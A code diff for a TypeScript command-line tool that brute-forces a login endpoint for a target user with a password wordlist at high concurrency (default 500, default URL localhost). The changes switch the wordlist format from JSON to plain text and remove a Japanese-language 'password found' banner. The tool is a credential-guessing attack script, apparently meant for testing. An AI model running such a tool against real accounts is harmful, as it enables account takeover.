@@ -33,7 +33,7 @@ function hasFlag(flag: string): boolean {
 }
 
 const TARGET   = getArg('--target');
-const WORDLIST = getArg('--wordlist') ?? path.resolve(process.cwd(), 'rockyou.json');
+const WORDLIST = getArg('--wordlist') ?? path.resolve(process.cwd(), 'dict.txt');
 const BASE_URL = getArg('--url')      ?? 'http://localhost:3000';
 const LIMIT        = getArg('--limit')        ? parseInt(getArg('--limit')!,        10) : Infinity;
 const CONCURRENCY  = getArg('--concurrency')  ? parseInt(getArg('--concurrency')!,  10) : 500;
@@ -97,7 +97,7 @@ async function main(): Promise<void> {
     verbose: VERBOSE,
   });
 
-  const passwords: string[] = JSON.parse(fs.readFileSync(WORDLIST, 'utf8'));
+  const passwords: string[] = fs.readFileSync(WORDLIST, 'utf8').split(/\r?\n/);
 
   let attempt       = 0; // 完了した試行数
   let queued        = 0; // 送信済み（完了待ち含む）試行数
@@ -139,35 +139,7 @@ async function main(): Promise<void> {
           const user    = (result.body as { user?: Record<string, unknown> }).user ?? null;
           const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
           const message = `Target:${TARGET} Password:${foundPassword}`;
-
-          // ─── 見つけた！バナー（stderr に出力） ────────────────────────────────
-          const W      = 62;
-          const border = '★'.repeat(W);
-          const pad    = (text: string) => {
-            const space = W - 2 - text.length;
-            const l     = Math.floor(space / 2);
-            const r     = space - l;
-            return `★${' '.repeat(l)}${text}${' '.repeat(r)}★`;
-          };
-
-          console.error('');
-          console.error(border);
-          console.error(pad(''));
-          console.error(pad('🎉  パスワードが見つかりました！  🎉'));
-          console.error(pad(''));
-          console.error(border);
-          console.error('');
-          console.error('┌─────────────────────────────────────────────────────┐');
-          console.error(`│  👤 ユーザー名  ：  ${TARGET!.padEnd(30)} │`);
-          console.error(`│  🔑 パスワード  ：  ${foundPassword!.padEnd(30)} │`);
-          console.error('├─────────────────────────────────────────────────────┤');
-          console.error(`│  🔢 試行回数    ：  ${String(attempt).padEnd(30)} │`);
-          console.error(`│  ⏱  経過時間    ：  ${(elapsed + '秒').padEnd(30)} │`);
-          console.error(`│  👥 ユーザー情報：  ${(user ? JSON.stringify(user) : 'なし').substring(0, 30).padEnd(30)} │`);
-          console.error('└─────────────────────────────────────────────────────┘');
-          console.error('');
-          console.error('');
-
+          
           // JSON ログ（stdout）
           log({
             event: 'success',
